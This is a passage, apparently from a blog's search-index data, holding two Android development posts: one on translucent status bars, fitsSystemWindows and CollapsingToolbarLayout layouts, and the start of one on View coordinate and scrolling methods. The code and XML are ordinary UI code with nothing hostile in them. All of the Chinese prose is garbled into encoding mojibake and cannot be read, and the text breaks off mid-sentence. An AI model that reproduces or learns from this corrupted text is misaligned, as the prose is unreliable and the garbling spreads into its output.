äº†ä¸€ä¸ªé¡¶éƒ¨çš„paddingï¼Œå…·ä½“åŸç†ä¹Ÿä¸å¤§æ¸…æ¥šã€‚ä½†å®é™…ä¸Šå¹¶ä¸æ€»èƒ½ä¸€ç›´ 3. ä½¿ç”¨CollapsingToolbarLayoutæ—¶çš„é—®é¢˜ 5.0ä»¥ä¸Šçš„æ‰‹æœºä¼¼ä¹å¾ˆç®€å• &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;android.support.design.widget.CoordinatorLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot; android:id=&quot;@+id/coordinateLayout&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:background=&quot;@android:color/background_light&quot; android:fitsSystemWindows=&quot;true&quot; &gt; &lt;android.support.design.widget.AppBarLayout android:id=&quot;@+id/appbarLayout&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;300dp&quot; android:theme=&quot;@style/ThemeOverlay.AppCompat.Dark.ActionBar&quot; android:fitsSystemWindows=&quot;true&quot; &gt; &lt;android.support.design.widget.CollapsingToolbarLayout android:id=&quot;@+id/collapsingToolbarLayout&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; app:contentScrim=&quot;?attr/colorPrimary&quot; app:expandedTitleMarginEnd=&quot;64dp&quot; app:expandedTitleMarginStart=&quot;48dp&quot; app:layout_scrollFlags=&quot;scroll|exitUntilCollapsed&quot; &gt; &lt;ImageView android:id=&quot;@+id/backdrop&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; android:scaleType=&quot;centerCrop&quot; android:src=&quot;@drawable/image_19&quot; app:layout_collapseMode=&quot;parallax&quot; android:fitsSystemWindows=&quot;true&quot; /&gt; &lt;android.support.v7.widget.Toolbar android:id=&quot;@+id/toolbar&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;?attr/actionBarSize&quot; app:layout_collapseMode=&quot;pin&quot; app:popupTheme=&quot;@style/ThemeOverlay.AppCompat.Light&quot; /&gt; &lt;/android.support.design.widget.CollapsingToolbarLayout&gt; &lt;/android.support.design.widget.AppBarLayout&gt; &lt;android.support.v4.widget.NestedScrollView android:id=&quot;@+id/nestedScrollView&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; app:layout_behavior=&quot;@string/appbar_scrolling_view_behavior&quot; &gt; &lt;TextView android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;wrap_content&quot; android:lineSpacingExtra=&quot;8dp&quot; android:padding=&quot;@dimen/activity_horizontal_margin&quot; android:text=&quot;@string/newsBody&quot; android:textSize=&quot;20sp&quot; /&gt; &lt;/android.support.v4.widget.NestedScrollView&gt; &lt;android.support.design.widget.FloatingActionButton android:id=&quot;@+id/fab&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_margin=&quot;@dimen/activity_horizontal_margin&quot; android:src=&quot;@android:drawable/ic_menu_slideshow&quot; app:layout_anchor=&quot;@id/appbarLayout&quot; app:layout_anchorGravity=&quot;bottom|right|end&quot; /&gt; &lt;/android.support.design.widget.CoordinatorLayout&gt; åªè¦åˆ†åˆ«åœ¨CoordinateLayoutï¼ŒAppBarLayoutå’ŒCollapsingToolbarLayoutçš„xmlå±æ€§ä¸­åŠ ä¸Šandroid:fitSystemWindow = â€œtrueâ€javaä»£ç é‡Œæ·»åŠ ä¸€å¥ getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS); //æ³¨æ„ä¸‹ç‰ˆæœ¬åˆ¤æ–­ æˆ–è€…åœ¨å½“å‰Activityçš„values-v19 stylesä¸­æ·»åŠ  trueå°±è¡Œäº†ã€‚å®é™…æ•ˆæœå°±æ˜¯å›¾ç‰‡å®Œå…¨å±•å¼€æ—¶å¯ä»¥æ‰©å±•åˆ°statusBarä¸‹é¢ï¼Œå›¾ç‰‡æ”¶ç¼©èµ·æ¥åå¯ä»¥è®©Toolbaråœåœ¨statusBarä¸‹é¢ã€‚ä½†åŒæ ·çš„ä»£ç åœ¨4.4çš„æ‰‹æœºä¸Šä¼šä½¿å¾—å®é™…ç»˜å›¾åŒºåŸŸè½åˆ°statusBarä»¥ä¸‹ï¼ŒstatusBarä½ç½®å˜æˆå¸¦ç°è‰²é®ç½©çš„ç™½è‰²èƒŒæ™¯ã€‚ 4. fitSystemWindowæ˜¯ä»€ä¹ˆæ„æ€fitSystemWindowså±æ€§ï¼šå®˜æ–¹æè¿°:Boolean internal attribute to adjust view layout based on system windows such as the status bar. If true, adjusts the padding of this view to leave space for the system windows. Will only take effect if this view is in a non-embedded activity.ç®€å•æ¥è¯´å°±æ˜¯å¦‚æœè®¾ç½®ä¸ºtrue,åœ¨è®¾ç½®äº†é€æ˜çŠ¶æ€æ æˆ–è€…å¯¼èˆªæ æ—¶ï¼Œæ­¤viewçš„æ‰€æœ‰paddingå±æ€§å¤±æ•ˆ(é€æ˜çŠ¶æ€æ çš„è¯ï¼ŒpaddingTopç­‰äºçŠ¶æ€æ é«˜åº¦ï¼›é€æ˜å¯¼èˆªæ çš„è¯ï¼ŒpaddingBootmç­‰äºNavigationBarçš„é«˜åº¦) å‡å®š:å¸ƒå±€æ–‡ä»¶åªæ˜¯ä¸€ä¸ªæ™®é€šçš„LinearLayout(fitSystemWindow = falseï¼ˆé»˜è®¤æƒ…å†µï¼‰),é¡¶éƒ¨includeä¸€ä¸ªtoolbar(fitSystemWindow = true )å°±å·²ç»å¯ä»¥å®ç°4.4ä»¥ä¸‹ï¼Œ4.4-5.0ï¼Œ5.0ä»¥ä¸Šçš„å„ç§åœºæ™¯äº†,(å‰æï¼Œä½¿ç”¨Appcompat çš„Themeï¼Œå› ä¸ºå®ƒä¼šä½¿ç”¨colorPrimaryDarkä¸ºstatusBarç€è‰²) ä½†æˆ‘çš„é—®é¢˜åœ¨äºå¸ƒå±€æ–‡ä»¶æ˜¯CoordinateLayout&gt; AppBarLyout&gt; CollapsingToolbarLayout&gt; Toolbar &amp; ImageViewè¿™ç§æƒ…å†µä¸‹ï¼Œç…§ç†è¯´Toolbaråº”è¯¥é¡¶éƒ¨ç•™æœ‰25dpçš„paddingï¼Œä¹Ÿå°±æ˜¯fitSystemWindow = trueï¼ˆå‡è®¾å°±åªæ˜¯è¿™ä¹ˆç®€å•ï¼‰ç„¶è€Œäº‹å®æ˜¯ï¼ŒfitSystemWindowä¼šè®©ä½ è®¾ç½®çš„paddingå¤±æ•ˆ,è€ŒImageViewéœ€è¦ä¾µå…¥åˆ°statusBarä¸‹é¢ï¼Œä¹Ÿå°±æ˜¯fitSystemWindow = falseã€‚é‚£å°±åªè¦åœ¨toolbarçš„xmlä¸­æ·»åŠ fitSystemWindowè¿™ä¸ªå±æ€§å¥½äº†ã€‚ç¼–è¯‘ï¼Œè¿è¡Œï¼Œ5.1æ‰‹æœºï¼ŒToolbarçš„å°ç®­å¤´ä¸€éƒ¨åˆ†è·‘åˆ°statusBarä¸‹é¢äº†ï¼Œæ„Ÿè§‰å°±åƒToolbarå¾€ä¸Šç§»åŠ¨äº†25dp(è¿™ä¸ªç›®æµ‹çš„å“ˆ)ï¼Œä¸å¯å–ã€‚ 5. æŸ¥æ‰¾åˆ°çš„ä¸€äº›è§£å†³æ–¹æ¡ˆ ä¸»è¦ä»‹ç»åŸç†äº†: ç±»ä¼¼äºSystemBarTintï¼Œåœ¨android.R.id.contentçš„Viewä¸­æ·»åŠ ä¸€ä¸ª ViewViewGroup.LayoutParams statusViewLp = new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, getStatusBarHeight()); contentView.addView(statusBarView,layoutParams) ActivityæŒæœ‰ä¸€ä¸ªPhoneWindowï¼ŒPhoneWindowæŒæœ‰ä¸€ä¸ªæ ¹Viewï¼Œå«DecorViewï¼ˆæ˜¯ä¸€ä¸ªFrameLayoutï¼‰ï¼ŒDecorViewæŒæœ‰ä¸€ä¸ªLinearLayoutï¼Œåœ¨LinearLayoutä¸‹åˆ†é…ä¸¤ä¸ªFrameLayoutï¼Œä¸€ä¸ªç»™ActionBarï¼ˆå½“è®¾ç½®ä¸»é¢˜ä¸ºNoActionBaræ˜¯ä¸ºViewStubï¼‰ï¼Œä¸€ä¸ªç»™ContentViewã€‚ä¸ç®¡å¦‚ä½•ï¼Œåªè¦æˆ‘ä»¬åœ¨LinearLayoutçš„ç¬¬ä¸€ä¸ªä½ç½®æ’å…¥ä¸€ä¸ªViewå°±å¯ä»¥è®©ContentViewä¸‹ç§»äº†ã€‚ç®€ä¹¦ä½œè€…è¿™ç§æ–¹å¼å…¶å®å·²ç»æ— æ‰€è°“æ˜¯å¦éœ€è¦åœ¨xmlä¸­fitSystemWindowäº†ï¼Œå› ä¸ºéƒ½ä¼šé€šè¿‡æ·»åŠ æœ€åä¸€ä¸ªViewçš„æ–¹å¼æŠŠçŠ¶æ€æ é‚£å—ç»™é®ä½äº†ã€‚ç”¨æ¥ç€è‰²å…¶å®æŒºå¥½çš„ã€‚ å¾€android.R.id.contentè¿™ä¸ªViewé‡Œé¢æ·»åŠ ä¸€ä¸ªå‡View,xmlä¸­fitSystemWindows å¾€android.R.id.contentè¿™ä¸ªViewçš„parenté‡Œé¢æ·»åŠ ä¸€ä¸ªå‡View,xmlä¸­fitSystemWindows 6.æˆ‘æœ€åå®ç°çš„è§£å†³æ–¹æ¡ˆï¼ˆ4.4,5.1å‡é€šè¿‡ï¼‰å…¶å®æ•´ä¸ªé—®é¢˜çš„å…³é”®å°±æ˜¯ä½ æ˜¯å¦æƒ³è¦åœ¨statusBaré‚£ä¸€å—é•¿æ¡çš„ä½ç½®ç”»ç”»ã€‚ã€‚ã€‚ã€‚ä¸€æ•´å¼ imageViewçš„è¯ï¼Œå½“ç„¶å¸Œæœ›èƒ½å¤ŸæŠŠå›¾ç‰‡å»¶ä¼¸åˆ°statusBarä»¥ä¸‹è€ŒToolbaråˆ™ä¸éœ€è¦å»¶ä¼¸åˆ°statusBarä»¥ä¸‹ã€‚æˆ‘å°è¯•äº†ç»™toolbaråŠ ä¸Špadding &gt;&gt;å¤±è´¥æˆ‘å°è¯•äº†ç»™toolbaråŠ ä¸Šmargin &gt;&gt;&gt;&gt; é—®é¢˜ç»ˆäºè§£å†³ æ‰€ä»¥æœ€åï¼Œæˆ‘çš„xmlæ–‡ä»¶ä¸­åˆ é™¤äº†æ‰€æœ‰çš„fitSystemWindowï¼Œåœ¨style-v19ä¸­æ·»åŠ äº†è¯¥åŠ çš„ä¸œè¥¿æœ€ååªåœ¨onCreateé‡Œé¢æ·»åŠ å‡ æ®µè¯ setSupportActionBar(binding.toolbar); getSupportActionBar().setDisplayHomeAsUpEnabled(true); //è¿™ä¸ªç”¨äºæ˜¾ç¤ºè¿”å›çš„å°ç®­å¤´ï¼Œè¿˜å¾—æŒ‡æ˜parentActivity getSupportActionBar().setTitle(&quot;&quot;); CollapsingToolbarLayout.LayoutParams params = (CollapsingToolbarLayout.LayoutParams) binding.toolbar.getLayoutParams(); params.setMargins(0, Utils.getStatusBarHeight(), 0, 0); //é¡¶éƒ¨åŠ ä¸ªmarginå°±å¥½äº† binding.toolbar.setLayoutParams(params); å®é™…æ“ä½œå¯èƒ½è¿˜è¦åˆ¤æ–­éç©ºä»€ä¹ˆçš„ï¼Œä½†å¤§è‡´æ„æ€å¦‚æ­¤çœ‹èµ·æ¥åƒè¿™æ ·5.1å›¾ç‰‡å±•å¼€: 5.1å›¾ç‰‡æ”¶èµ·: 4.4å›¾ç‰‡å±•å¼€: 4.4å›¾ç‰‡æ”¶èµ·: åŸç†å°±æ˜¯è®©æ•´ä¸ªå¸ƒå±€å æ®statusBarçš„ä½ç½®ï¼Œä½†æŠŠToolbarå¾€ä¸‹æŒªä¸€ç‚¹ï¼ˆå…¶å®ä¹Ÿå°±æ˜¯è¿™ç¯‡æ–‡ç« ä¸­æ‰€æ¨èçš„ç»™contentViewçš„ç»™ç¬¬ä¸€ä¸ªchildViewæ·»åŠ marginTopçš„æ–¹æ³•ï¼‰ 7.åœ¨onCreateä¹‹åè®¾ç½®fitSystemWindowså¹¶ä¸ä¼šæŠŠContentViewå¾€ä¸ŠæŒªæˆ–å¾€ä¸‹æŒª.è‡ªå·±æµ‹è¯•äº†ä¸€ä¸‹ï¼Œåœ¨æ ¹å¸ƒå±€é‡Œæ·»åŠ fitSystemWindows = trueä¹‹åï¼Œåœ¨Activityçš„onCreateé‡Œé¢æ˜¯å¯ä»¥ä½¿ç”¨ViewCompat.setfitSystems(rootView,false)è®¾ç½®èµ·ä½œç”¨çš„ã€‚ä½†ä¹Ÿåªé™äºonCreateçš„æ—¶å€™ã€‚ä¾‹å¦‚æ·»åŠ ä¸€ä¸ªç‚¹å‡»äº‹ä»¶ï¼Œåœ¨onClické‡Œé¢setFitSystemWindowsï¼Œæ˜¯ä¸ä¼šæŠŠRootViewå¾€ä¸‹æŒªçš„ã€‚è¿™ç§æƒ…å†µå°±éœ€è¦ä¸€å¼€å§‹å°±ç¡®ä¿fitSystem = falseï¼Œç„¶åéœ€è¦å¾€ä¸‹æŒªçš„æ—¶å€™ï¼Œç»™è®¾ç½®ä¸€ä¸ªFrameLayout.LayoutParamsçš„TopMarginå°±å¯ä»¥äº†ã€‚æ³¨æ„æ¥å›åˆ‡æ¢(å…¨å±æ¨¡å¼å’Œç€è‰²æ¨¡å¼ä¹‹é—´åˆ‡æ¢)çš„æ—¶å€™è¦çœ‹ä¸‹rootViewçš„getTop,å› ä¸ºMarginTopè®¾ç½®äº†ä¹‹åä¼šå¯¼è‡´Top!=0ã€‚å…¶å®fitSystemWindowsæ˜¯åœ¨FitSystemWindowLinearLayoutä¸­æ·»åŠ Paddingèµ·æ•ˆçš„ï¼ŒåæœŸæ“ä½œçš„Marginåªæ˜¯å¯¹å…¶Child ContentFrameLayoutè¿›è¡Œæ“ä½œã€‚æ‰€ä»¥ï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘è§‰å¾—ç›´æ¥å…¨éƒ¨å¼„æˆfitSystemWindows = falseï¼Œå…ˆæŠŠstatusBaråé¢çš„ç©ºé—´å æ®äº†å†è¯´ï¼Œåé¢å†é€šè¿‡æ‰‹åŠ¨è®¾ç½®Marginä¸Šä¸‹æŒªåŠ¨ã€‚ 8. ä¸€äº›ä¸è¦çŠ¯çš„å°é”™è¯¯ åœ¨Themeä¸­æ·»åŠ  &lt;item name=&quot;android:fitsSystemWindows&quot;&gt;true&lt;/item&gt; è¿™ä¼šå¯¼è‡´Toastçš„æ–‡å­—å¾€ä¸Šåç§»ï¼Œæ‰€ä»¥ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨fitSystemWinow = trueçš„è¯ï¼Œè¯·è€è€å®å®å»xmlä¸­å†™ çŠ¶æ€æ é‚£ä¸€å—å¦‚æœä½ ä¸å»å æ®çš„è¯ï¼Œè€Œä½ åˆå£°æ˜äº†windowTranslucentStatusï¼Œv21ä¸Šé»˜è®¤çš„é¢œè‰²åº”è¯¥æ˜¯colorPrimaryDark(æ˜¯çš„ï¼ŒAppCompatå¸®ä½ ç…§é¡¾å¥½äº†)v19ä¸Šå°±æ˜¯ä¸€ç‰‡å¸¦é˜´å½±çš„ç™½è‰²(AppCompatä¸ä¼šåœ¨è¿™ä¸ªç‰ˆæœ¬ä¸Šå¸®ä½ ç€è‰²statusBar)ã€‚ 6.0ä»¥ä¸Šå¯ä»¥è®¾ç½®statusBarå­—ä½“çš„é¢œè‰²äº†ï¼Œè¿™ä¸ªéšä¾¿æ‰¾æ‰¾å°±æœ‰äº† Ian Lakeåœ¨mediumä¸Šç»™å‡ºäº†å¯¹äºfitSystemWindowçš„æƒå¨è§£é‡Šï¼Œéå¸¸æœ‰ä»·å€¼ã€‚ 9. ä¸‹é¢è¿™æ®µè¯å¯èƒ½å¯¹äºç†è§£windowæœ‰ä¸€å®šå¸®åŠ©fitsSystemWindows, è¯¥å±æ€§å¯ä»¥è®¾ç½®æ˜¯å¦ä¸ºç³»ç»Ÿ View é¢„ç•™å‡ºç©ºé—´, å½“è®¾ç½®ä¸º true æ—¶,ä¼šé¢„ç•™å‡ºçŠ¶æ€æ çš„ç©ºé—´.ContentView, å®è´¨ä¸º ContentFrameLayout, ä½†æ˜¯é‡å†™äº† dispatchFitSystemWindows æ–¹æ³•, æ‰€ä»¥å¯¹å…¶è®¾ç½® fitsSystemWindows æ— æ•ˆ.ContentParent, å®è´¨ä¸º FitWindowsLinearLayout, é‡Œé¢ç¬¬ä¸€ä¸ª View æ˜¯ ViewStubCompat, å¦‚æœä¸»é¢˜æ²¡æœ‰è®¾ç½® title ,å®ƒå°±ä¸ä¼š inflate .ç¬¬äºŒä¸ª View å°±æ˜¯ ContentView.å¦å¤–ï¼Œå¦‚æœä½¿ç”¨AppCompatï¼Œåœ¨api21ä»¥ä¸Šï¼Œä¼šè‡ªåŠ¨å°†çŠ¶æ€æ é¢œè‰²è®¾ç½®ä¸ºcolorPrimaryDarkã€‚æœ€åæ„Ÿè°¢ç½‘ä¸Šå„ä½åšä¸»ä¸è¾è¾›è‹¦å†™å‡ºæ¥çš„å¹²è´§ï¼Œè®©æˆ‘èƒ½å¤Ÿæ¯”è¾ƒç®€å•çš„å¤åˆ¶ç²˜è´´ä»–ä»¬çš„ä»£ç æ¥æ£€éªŒï¼Œå†™åšå®¢çœŸçš„å¾ˆç´¯ã€‚ Updatesè¿™ä¸ªæ˜¯ç”¨æ¥æ˜¾ç¤ºæˆ–è€…éšè—çŠ¶æ€æ ä½ç½®çš„æ–‡å­—çš„ï¼Œå…¶å®ä¹Ÿå°±æ˜¯youtubeä¸Šä¸€ä¸ªgoogle devçš„è§†é¢‘ä¸­çš„éƒ¨åˆ†å†…å®¹äº†ï¼Œäº²æµ‹å¥½ç”¨ï¼Œæ¯”å¦‚å…¨å±æ’­æ”¾è§†é¢‘çš„æ—¶å€™å¯ä»¥è°ƒç”¨ä¸€ä¸‹ã€‚ // This snippet hides the system bars. private void hideSystemUI() { // Set the IMMERSIVE flag. // Set the content to appear under the system bars so that the content // doesn&#39;t resize when the system bars hide and show. mDecorView.setSystemUiVisibility( View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION // hide nav bar | View.SYSTEM_UI_FLAG_FULLSCREEN // hide status bar | View.SYSTEM_UI_FLAG_IMMERSIVE); } // This snippet shows the system bars. It does this by removing all the flags // except for the ones that make the content appear under the system bars. private void showSystemUI() { mDecorView.setSystemUiVisibility( View.SYSTEM_UI_FLAG_LAYOUT_STABLE | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN); } ä¸€æ—¦ä½¿ç”¨äº†windowTranslucentSystemBarï¼Œä½ çš„Activityçš„Windowä¸­å°†ä¸å†æ‹¥æœ‰statusBarViewå’ŒNavigationBarView(è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆapiæ–‡æ¡£ä¸Šè¯´setStatusBarColorä¸èƒ½åœ¨è®¾ç½®äº†translucentFlagçš„å‰æä¸‹ä½¿ç”¨)fitSystemWindowsåœ¨å¤§éƒ¨åˆ†Viewä¸­çš„å®ç°éƒ½æ˜¯åŠ äº†ä¸€ä¸ªpadding Chris Banesæ¨èçš„çš„è·å–statusBarçš„é«˜åº¦çš„æ–¹æ³• myView.setOnApplyWindowInsetsListener { View, inset, -&gt; val statusBarSize = insets.systemWindowInsetTop return insets } Reference Android-transulcent-status-baræ€»ç»“ ç”±æ²‰æµ¸å¼çŠ¶æ€æ å¼•å‘çš„è¡€æ¡ˆ Androidå¼€å‘ï¼šTranslucent System Bar çš„æœ€ä½³å®è·µ Why would I want to fitsSystemWindows","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"Window","slug":"Window","permalink":"https://haldir65.github.io/tags/Window/"},{"name":"statusBar","slug":"statusBar","permalink":"https://haldir65.github.io/tags/statusBar/"}]},{"title":"å®‰å“åæ ‡ç³»å¸¸ç”¨æ–¹æ³•","date":"2016-10-13T18:17:02.000Z","path":"2016/10/13/2016-10-13-Android-coordinate-System/","text":"è®°å½•ä¸€äº›Androidç³»ç»Ÿåæ ‡ç³»çš„å¸¸ç”¨æ–¹æ³•ï¼Œå› ä¸ºæ—¥å¸¸å¼€å‘ä¸­éš¾å…ä¼šç¢°åˆ°éœ€è¦å•ç‹¬è®¡ç®—Viewç³»ç»Ÿåæ ‡çš„æƒ…å†µã€‚ ScrollToï¼ŒScrollByï¼ŒgetVisibleRectè¿™äº›æ–¹æ³•å¹³æ—¶æƒ³è¦ç”¨çš„æ—¶å€™æ€»è¦å»ç½‘ä¸ŠæŸ¥æ‰¾ï¼Œè¿™é‡Œè®°å½•ä¸‹æ¥ï¼Œæ–¹ä¾¿ä»Šåç›´æ¥å‚è€ƒé¦–å…ˆæ˜¯ä¸€å¼ å¾ˆå¤šäººéƒ½è§è¿‡çš„å›¾ä¸­é—´çš„è“è‰²çš„ç‚¹æ˜¯TouchEventå‘ç”Ÿæ—¶ï¼Œè·å¾—çš„MotionEvent.getX()ã€getY()ã€‚ 1. åæ ‡åŸç‚¹å’Œåæ ‡è½´æ–¹å‘åæ ‡åŸç‚¹æœ‰ä¸¤ç§ï¼Œå±å¹•å·¦ä¸Šè§’ï¼ˆstatusBarä¹ŸåŒ…å«å…¶ä¸­ï¼‰å’Œçˆ¶æ§ä»¶å·¦ä¸Šè§’åæ ‡è½´æ–¹å‘ï¼šXè½´å‘å³ï¼ŒYè½´å‘ä¸‹ï¼ŒZè½´(5.0å¢åŠ )å‘ä¸Šã€‚ 2. Left,Top,Right,Bottomè€ŒTopï¼Œleftï¼Œbottom,downåˆ†åˆ«å¯¹åº”ç€å…¶å…¶ç›¸å¯¹äºçˆ¶æ§ä»¶çš„è·ç¦»ï¼Œç”±æ­¤å¯ä»¥è®¡ç®—å¾—åˆ°Viewçš„å®½åº¦width = getRight()-getLeft() ,Viewçš„é«˜åº¦ height = getBottom()-getTop()è€Œå®é™…ä¸Šview.getHeight()æ–¹æ³•çš„å®ç°ä¹Ÿå°±æ˜¯mBottom-mTop. 3. X , YXä»£è¡¨çš„æ˜¯å½“å‰Viewçš„å·¦ä¸Šè§’é‚£ä¸ªç‚¹çš„æ¨ªåæ ‡ï¼ŒYä»£è¡¨çš„æ˜¯çºµåæ ‡ã€‚X = left + getTranslationXY = Top + getTranslationYé€šå¸¸åœ¨åŠ¨ç”»ä¸­ä½¿ç”¨setTranslationXæ¥å®ç°åç§»æ•ˆæœï¼Œæ³¨æ„ï¼Œè¿™æ˜¯ä¸ä¼šæ”¹å˜leftçš„ã€‚åœ¨æ»‘åŠ¨è¿‡ç¨‹ä¸­ï¼Œx, yä¼šéšç€æ”¹å˜ã€‚ 4. å‡ ä¸ªè·ŸRectç›¸å…³çš„è·å¾—çš„æ˜¯å½“å‰Viewå·¦ä¸Šè§’è·ç¦»å±å¹•å·¦ä¸Šè§’çš„ä½ç½®ï¼Œä¸ºæ­¤æˆ‘ä¸“é—¨æµ‹è¯•äº†ä¸€ä¸‹ W/ViewAnimationActivity.java: [32 | onWindowFocusChanged]statusBarHeight = 75 W/ViewAnimationActivity.java: [35 | onWindowFocusChanged]getLocationInWindow x = 0 y = 75 W/ViewAnimationActivity.java: [38 | onWindowFocusChanged]getLocationOnScreen x = 0 y = 75å¯ä»¥çœ‹åˆ°è¿”å›çš„å°±æ˜¯Viewå·¦ä¸Šè§’çš„åæ ‡ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸¤è€…åŒºåˆ«ä¸é‡è¦ï¼ŒstackoverFlowä¸Šæœ‰è®¨è®º View.getLocationInWindow(pos); //è·å–åœ¨å½“å‰windowå†…çš„ç»å¯¹åæ ‡ View.getLocationOnScreen(pos); //åŒ…æ‹¬statusBarï¼Œä»¥å±å¹•å·¦ä¸Šè§’ä¸ºåæ ‡åŸç‚¹ View.getLocalVisibleRect() //ä»¥viewè‡ªèº«çš„å·¦ä¸Šè§’ä¸ºåæ ‡åŸç‚¹ï¼Œè¿™ä¸ªå¾ˆæœ‰ç”¨ï¼Œ //è¿”å›çš„åæ ‡ä¸€å®šæ˜¯(0,0,xxx,xxx)è¿™æ ·çš„ï¼Œå¯ä»¥åˆ¤æ–­å½“å‰Viewæ˜¯å¦å®Œå…¨å¯è§ View.getGlobalVisibleRect() // ä»¥å±å¹•å·¦ä¸Šè§’ä¸ºåæ ‡åŸç‚¹ ä»¥ä¸Šå››ä¸ªæ–¹æ³•åœ¨onCreateé‡Œé¢è¿”å›çš„å€¼éƒ½æ˜¯0ï¼Œéœ€è¦åœ¨Activityçš„onWindowFocusChanged(true)ä¸­å»è·å¾—è¿™é‡Œéœ€è¦æ‰¯ä¸€ç‚¹å…³äºwindowçš„é—®é¢˜ï¼Œæ ¹æ®å¤§éƒ¨åˆ†åšå®¢çš„ä»‹ç»ï¼šDecorViewæ˜¯FrameLayoutçš„å­ç±»ï¼Œæ˜¯Viewè§†å›¾å±‚çº§æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚ä¸€èˆ¬ä¼šæœ‰ä¸€ä¸ªLinearLayoutçš„child ä¸ºæ­¤ï¼Œæˆ‘åœ¨setContentViewé‡Œé¢æ”¾äº†ä¸€ä¸ªCoordinateLayout,ä½¿ç”¨Hierarchy Viewæˆªå›¾çš„åˆ°è¿™æ ·çš„ç»“æœã€‚å›¾ç‰‡æœ‰ç‚¹å¤§ åœ¨ViewHirearchyä¸­å¯ä»¥çœ‹åˆ°ï¼ŒActivityä¸­Viewè§†å›¾å±‚çº§ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡ä¸ºï¼š PhoneWindow$DecorViewï¼ˆæœ‰ä¸‰ä¸ªchild,åˆ†åˆ«æ˜¯LinearLayoutï¼ŒView(id/statusBarBackground)å’ŒView(id/navigationBarBackground)ï¼‰LinearLayoutFrameLayoutFitWindowsLinearLayoutContentFrameLayout(id/android.R.id.content) //è¿™åœ¨å¼€å‘è¿‡ç¨‹ä¸­æœ‰æ—¶ä¼šç”¨åˆ°setContentViewè®¾ç½®çš„view å…³äºwindowï¼ŒDecorWindowçš„æ–‡ç« ç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œä»”ç»†ç ”ç©¶ä¸‹ä¼šå¯¹ç†è§£Viewçš„æµ‹é‡æœºåˆ¶æœ‰ä¸€å®šå¥½å¤„ï¼Œè¿™å¯¹äºViewçš„å·¥ä½œåŸç†ä¹Ÿèƒ½å¤Ÿæ›´å½»åº•çš„ç†è§£ã€‚å‚è€ƒæ–‡ç« æ—¥å¸¸å¼€å‘ä¸­ï¼ŒsetContentViewè¿™ä¸ªæ–¹æ³•åªæ˜¯å°†æˆ‘ä»¬è‡ªå·±å†™çš„activiy_main.xmlå¸ƒå±€æ–‡ä»¶inflateå‡ºæ¥çš„viewæ·»åŠ åˆ°android.R.id.contentè¿™ä¸ªViewGroupä¸­ï¼Œå®è·µä¸‹æ¥å‘ç°è¿™æ˜¯ä¸€ä¸ªContentFrameLayoutçš„å®ä¾‹ï¼Œå®ƒçš„childåªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯æˆ‘ä»¬é€šè¿‡setContentViewæ·»åŠ çš„View 5. è®©Viewæ»‘åŠ¨èµ·æ¥ offsetLeftAndRight(int offset) //ç»™leftå’ŒrightåŠ ä¸Šä¸€ä¸ªå€¼ï¼Œæ”¹å˜çš„æ˜¯Viewçš„ä½ç½®offsetTopAndBottom(int offset) scrollTo(int x,int y) // å°†Viewä¸­çš„å†…å®¹ç§»åŠ¨ï¼Œåæ ‡åŸç‚¹ä¸ºparentViewå·¦ä¸Šè§’ï¼Œæ³¨æ„ï¼Œå‚æ•°ä¸ºæ­£ï¼Œæ•ˆæœä¸ºåä¾‹å¦‚scrollTo(-100,0) åœ¨æ‰‹æœºä¸Šçœ‹æ•ˆæœæ˜¯å¾€å³ç§»åŠ¨äº† scrollBy(int x, int y) scrollByçš„æºç å¦‚ä¸‹: public void scrollBy(int x, int y) { scrollTo(mScrollX + x, mScrollY + y); } è¿˜æœ‰ä¸€äº›ä¸å¸¸ç”¨çš„ï¼š public void setScrollX(int value) { scrollTo(value, mScrollY); } 6. æ”¹å˜LayoutParamsçš„marginè®©Viewç§»åŠ¨è¿™æ˜¯ä¸€ç§å¾ˆç”Ÿç¡¬çš„æ–¹å¼ï¼Œä¸å¸¸ç”¨ MarginLayoutParams params = (MarginLayoutParams)mTextView.getLayoutParams(); //å¯èƒ½ä¸ºnull params.leftMargin + = 100; mTextView.setLayoutParams();// è¿™é‡Œé¢è°ƒç”¨äº†requestLayout 7.ä½¿ç”¨Animationè®©ViewåŠ¨èµ·æ¥æ ¹æ®å®˜æ–¹æ–‡æ¡£çš„å®šä¹‰Androidä¸­ä¸€å…±ä¸¤ç§Animation: Property AnimationView Animation(åŒ…æ‹¬Tween animation, Frame animation) é¦–å…ˆä»packageçš„ä½ç½®æ¥çœ‹å±æ€§åŠ¨ç”»éƒ½ä½äºandroid.animationè¿™ä¸ªpackageä¸‹é¢ï¼Œå¸¸è§çš„å¦‚ObjectAnimatorç»§æ‰¿è‡ªValueAnimatorViewåŠ¨ç”»åˆ™ä½äºandroid.view.animationè¿™ä¸ªpackageä¸‹ï¼Œå¸¸è§çš„å¦‚TranslateA,AlphaAnimationç­‰ View Animationå¯ä»¥ä»£ç 